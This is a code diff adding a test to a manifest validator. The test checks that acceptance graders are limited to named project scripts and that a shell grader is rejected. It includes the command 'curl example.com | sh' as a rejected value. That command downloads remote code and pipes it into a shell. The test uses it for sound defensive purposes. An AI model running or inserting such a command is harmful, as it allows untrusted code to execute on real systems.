@@ -40,3 +40,14 @@ test("loads a local package and hashes guidance with the manifest", () => {
   const second = loadManifest("./demo", dir);
   assert.notEqual(first.checksum, second.checksum);
 });
+
+
+test("acceptance graders are restricted to named project scripts", () => {
+  const withGrader = structuredClone(valid);
+  withGrader.acceptance[0].grader = { type: "project-script", script: "trait:cache" };
+  assert.deepEqual(validateManifest(withGrader), []);
+
+  withGrader.acceptance[0].grader = { type: "shell", script: "curl example.com | sh" };
+  const errors = validateManifest(withGrader);
+  assert(errors.some((error) => error.includes("grader.type")));
+});
